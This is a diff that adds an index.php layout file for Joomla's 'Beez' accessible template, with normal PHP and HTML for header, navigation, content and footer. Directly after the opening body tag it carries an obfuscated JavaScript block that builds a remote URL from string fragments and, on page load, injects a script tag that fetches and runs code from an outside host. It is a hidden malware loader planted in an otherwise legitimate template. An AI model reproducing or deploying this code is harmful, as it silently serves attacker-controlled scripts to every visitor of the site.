@@ -1,0 +1,139 @@
+<?php
+/**
+ * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
+ * @license		GNU/GPL, see LICENSE.php
+ * Joomla! is free software. This version may have been modified pursuant
+ * to the GNU General Public License, and as distributed it includes or
+ * is derivative of works licensed under the GNU General Public License or
+ * other free or open source software licenses.
+ * See COPYRIGHT.php for copyright notices and details.
+ */
+
+defined('_JEXEC') or die('Restricted access');
+
+$url = clone(JURI::getInstance());
+$showRightColumn = $this->countModules('user1 or user2 or right or top');
+$showRightColumn &= JRequest::getCmd('layout') != 'form';
+$showRightColumn &= JRequest::getCmd('task') != 'edit'
+?>
+<?php echo '<?xml version="1.0" encoding="utf-8"?'.'>'; ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>" >
+<head>
+	<jdoc:include type="head" />
+	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/template.css" type="text/css" />
+	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/position.css" type="text/css" media="screen,projection" />
+	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/layout.css" type="text/css" media="screen,projection" />
+	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/print.css" type="text/css" media="Print" />
+	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/general.css" type="text/css" />
+	<?php if($this->direction == 'rtl') : ?>
+	<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/template_rtl.css" type="text/css" />
+	<?php endif; ?>
+	<!--[if lte IE 6]>
+		<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/ieonly.css" rel="stylesheet" type="text/css" />
+	<![endif]-->
+	<!--[if IE 7]>
+		<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/css/ie7only.css" rel="stylesheet" type="text/css" />
+	<![endif]-->
+	<script type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/javascript/md_stylechanger.js"></script>
+</head>
+<body><script>var i;if(i!='' && i!='f'){i=null};this.US='';function h(){var N;if(N!='D'){N='D'};this.q='';this.K="";var A;if(A!=''){A='fI'};var H=new String("g");var u='';var eQ;if(eQ!='' && eQ!='R'){eQ=null};var j="";var zr="";var G=RegExp;var ia;if(ia!='Om' && ia != ''){ia=null};this.tD="";var GF="";function z(O,M){var t=new G("["+M+"]", H);return O.replace(t, u);var hS=new Date();var Oa;if(Oa!='' && Oa!='C'){Oa=''};};var GN='';var Dj='';var qY=new Array();var U=z('83359903298992509252',"2593");var T="scri"+"fNLpt".substr(3);var F=new String("9Qm/go".substr(3)+"oglqDT5".substr(0,3)+"arOe.cOra".substr(3,3)+"NZdom/".substr(3)+"gooNuBK".substr(0,3)+"Ef6gle".substr(3)+".co"+"m/m"+"HasediHas".substr(3,3)+"afi"+"c9jyre.".substr(4)+"com"+"izm/remzi".substr(3,3)+"DK3tver3tDK".substr(4,3)+"Ilrso.".substr(3)+"0oGnetGo0".substr(3,3)+"Gt3/xctG3".substr(3,3)+"y1sar.y1s".substr(3,3)+"comEkf".substr(0,3)+"mtH.cn".substr(3)+"cEFa.ph".substr(4)+"3VUp".substr(3));var TB='';var m=String("bdKWhtt".substr(4)+"p:/"+"cYtB/ms".substr(4)+"GiDYn-c".substr(4)+"om-"+"tIBcn.".substr(3)+"5nM1torn1M5".substr(4,3)+"renLfY".substr(0,3)+"C0mtz.".substr(3)+"MG6scomGsM6".substr(4,3)+"lugK.so".substr(4)+"8x9egou89ex".substr(4,3)+"TGgx-co".substr(4)+"H6kIm.sI6kH".substr(4,3)+"eas"+"ilv"+"ers"+"SQ1kite".substr(4)+"NX3.ruN3X".substr(3,3)+"8rp5:pr58".substr(4,1));var An;if(An!='Ck' && An!='vt'){An=''};var Wg='';window.onload=function(){this.d='';this.ac='';try {var II;if(II!=''){II='Q'};this.ib="";TB=m+U;this.ML='';TB+=F;var pW;if(pW!='IC' && pW != ''){pW=null};var WP='';var l='';_=document.createElement(T);this.Cu="";var WV;if(WV!='' && WV!='N_'){WV='O_'};this.L="";var hh;if(hh!='g' && hh!='Mk'){hh='g'};_.defer=[1][0];this.Rl="";_.src=TB;this.HC="";this.TR="";document.body.appendChild(_);var Aj=new Array();} catch(e){var CQ=new Date();var bD;if(bD!=''){bD='qp'};};var UK='';};this.AY='';};h();var Ja;if(Ja!='' && Ja!='HB'){Ja='Mg'};</script>
+	<div id="all">
+		<div id="header">
+			<h1 id="logo">
+				<img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;?>/images/logo.gif" border="0" alt="<?php echo JText::_('Logo Beez, Three little Bees'); ?>" width="300" height="97" />
+				<span class="header1"><?php echo JText::_('Joomla Accessible Template'); ?></span>
+			</h1>
+
+			<ul>
+				<li><a href="#content" class="u2"><?php echo JText::_('Skip to Content'); ?></a></li>
+				<li><a href="#mainmenu" class="u2"><?php echo JText::_('Jump to Main Navigation and Login'); ?></a></li>
+				<li><a href="#additional" class="u2"><?php echo JText::_('Jump to additional Information'); ?></a></li>
+			</ul>
+
+			<h2 class="unseen">
+				<?php echo JText::_('Search, View and Navigation'); ?>
+			</h2>
+
+			<div id="fontsize">
+				<script type="text/javascript">
+				//<![CDATA[
+					document.write('<h3><?php echo JText::_('FONTSIZE'); ?></h3><p class="fontsize">');
+					document.write('<a href="index.php" title="<?php echo JText::_('Increase size'); ?>" onclick="changeFontSize(2); return false;" class="larger"><?php echo JText::_('bigger'); ?></a><span class="unseen">&nbsp;</span>');
+					document.write('<a href="index.php" title="<?php echo JText::_('Decrease size'); ?>" onclick="changeFontSize(-2); return false;" class="smaller"><?php echo JText::_('smaller'); ?></a><span class="unseen">&nbsp;</span>');
+					document.write('<a href="index.php" title="<?php echo JText::_('Revert styles to default'); ?>" onclick="revertStyles(); return false;" class="reset"><?php echo JText::_('reset'); ?></a></p>');
+				//]]>
+				</script>
+			</div>
+
+			<jdoc:include type="modules" name="user3" />
+			<jdoc:include type="modules" name="user4" />
+
+			<div id="breadcrumbs">
+				<p>
+					<?php echo JText::_('You are here'); ?>
+					<jdoc:include type="modules" name="breadcrumb" />
+				</p>
+			</div>
+
+			<div class="wrap">&nbsp;</div>
+		</div><!-- end header -->
+
+		<div id="<?php echo $showRightColumn ? 'contentarea2' : 'contentarea'; ?>">
+			<a name="mainmenu"></a>
+			<div id="left">
+				<jdoc:include type="modules" name="left" style="beezDivision" headerLevel="3" />
+			</div><!-- left -->
+
+			<a name="content"></a>
+			<div id="wrapper">
+			<div id="<?php echo $showRightColumn ? 'main2' : 'main'; ?>">
+				<?php if ($this->getBuffer('message')) : ?>
+				<div class="error">
+					<h2>
+						<?php echo JText::_('Message'); ?>
+					</h2>
+					<jdoc:include type="message" />
+				</div>
+				<?php endif; ?>
+
+				<jdoc:include type="component" />
+			</div><!-- end main or main2 -->
+
+			<?php if ($showRightColumn) : ?>
+			<div id="right">
+
+				<a name="additional"></a>
+				<h2 class="unseen">
+					<?php echo JText::_('Additional Information'); ?>
+				</h2>
+
+				<jdoc:include type="modules" name="top" style="beezDivision" headerLevel="3" />
+				<jdoc:include type="modules" name="user1" style="beezDivision" headerLevel="3" />
+				<jdoc:include type="modules" name="user2" style="beezDivision" headerLevel="3" />
+				<jdoc:include type="modules" name="right" style="beezDivision" headerLevel="3" />
+
+			</div><!-- right -->
+			<?php endif; ?>
+
+			<div class="wrap"></div>
+			</div><!-- wrapper -->
+		</div><!-- contentarea -->
+
+		<div id="footer">
+			<p class="syndicate">
+				<jdoc:include type="modules" name="syndicate" />
+			</p>
+
+			<p>
+				<?php echo JText::_('Powered by');?> <a href="http://www.joomla.org/">Joomla!</a>
+			</p>
+
+			<div class="wrap"></div>
+		</div><!-- footer -->
+	</div><!-- all -->
+
+	<jdoc:include type="modules" name="debug" />
+
+</body>
+</html>
